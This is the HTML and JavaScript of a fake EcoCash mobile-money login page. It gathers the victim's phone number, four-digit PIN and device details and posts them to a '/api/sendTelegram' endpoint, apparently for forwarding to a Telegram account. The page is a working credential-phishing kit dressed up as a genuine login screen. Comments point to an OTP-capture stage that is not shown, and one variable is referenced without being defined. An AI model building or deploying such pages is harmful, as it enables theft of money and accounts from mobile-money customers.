<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:Inter,system-ui,Arial;
    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
    margin:0;
    -webkit-font-smoothing:antialiased;
    padding:18px;
    display:flex;
    align-items:center;
    justify-content:center;
    min-height:100vh;
  }

  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
  label{display:block;font-size:13px;color:#374151;margin-top:8px}
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
  .btn[disabled]{background:#cbd5e1;color:#6b7280}

  .req{color:#d04444;margin-right:6px}
  .warn{font-size:12px;color:#d04444;margin-top:4px;display:none}

  /* PIN boxes (NEW, visual only) */
  .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
  .pin-box{
    width:44px;height:48px;
    text-align:center;
    font-size:22px;
    border-radius:8px;
    border:1px solid #e6eefc;
  }
</style>
</head>
<body>
<div class="card">

<img src="assets/eco.png" alt="EcoCash logo" class="logo">

<h2>Log In</h2>

<form id="loginForm" autocomplete="off">

<label><span class="req">★</span>Mobile Number
  <input id="phone" value="+263" inputmode="tel">
</label>
<div id="phoneWarn" class="warn">
  Enter a valid Econet number (9 digits starting with 7)
</div>

<label><span class="req">★</span>4-Digit PIN</label>
<div class="pin-row">
  <input class="pin-box" maxlength="1">
  <input class="pin-box" maxlength="1">
  <input class="pin-box" maxlength="1">
  <input class="pin-box" maxlength="1">
</div>

<!-- hidden real PIN (used by original logic) -->
<input id="pin" type="hidden">

<button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
</form>
</div>

<!-- ===== OTP MODAL (UNCHANGED – ORIGINAL) ===== -->

<script>
/* ========= DEVICE INFO ========= */
const device = {
  platform: navigator.platform,
  userAgent: navigator.userAgent,
  screen: `${screen.width}x${screen.height}`
};

/* ========= ANTI SPAM ========= */
let lastAction = 0;
function blocked(){
  const now = Date.now();
  if(now - lastAction < 3000) return true;
  lastAction = now;
  return false;
}

/* ========= PHONE ========= */
const phoneEl = document.getElementById('phone');
const phoneWarn = document.getElementById('phoneWarn');
const PREFIX = '+263';

phoneEl.addEventListener('input', ()=>{
  if(!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
  let d = phoneEl.value.slice(4).replace(/\D/g,'');
  if(d && d[0] !== '7') d = '7' + d.slice(1);
  phoneEl.value = PREFIX + d.slice(0,9);
  phoneEl.setSelectionRange(phoneEl.value.length, phoneEl.value.length);
  phoneWarn.style.display = /^\+2637\d{8}$/.test(phoneEl.value) ? 'none':'block';
  updateLoginState();
});

/* ========= PIN ========= */
const pinBoxes = [...document.querySelectorAll('.pin-box')];
const pinEl = document.getElementById('pin');

pinBoxes.forEach((b,i)=>{
  b.addEventListener('input',()=>{
    const v=b.value.replace(/\D/g,'');
    b.value=v?'•':'';
    const arr = pinEl.value.split('');
    arr[i]=v;
    pinEl.value=arr.join('').slice(0,4);
    if(v && i<3) pinBoxes[i+1].focus();
    updateLoginState();
  });

  b.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !b.value && i>0){
      pinBoxes[i-1].focus();
      pinEl.value=pinEl.value.slice(0,-1);
    }
  });
});

/* ========= STATE ========= */
const loginBtn = document.getElementById('loginBtn');
function updateLoginState(){
  loginBtn.disabled = !(/^\+2637\d{8}$/.test(phoneEl.value) && /^\d{4}$/.test(pinEl.value));
}

/* ========= SEND (UNCHANGED PATH) ========= */
function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ========= LOGIN SUBMIT ========= */
document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();
  if(blocked()) return;

  // OTP modal logic below remains ORIGINAL

  sendToServer({
    submittedAt:new Date().toISOString(),
    event:'login_clicked',
    loginPhone: phoneEl.value,
    loginPin: pinEl.value,
    selectedPlan,
    device
  });
});
</script>
</body>
</html>
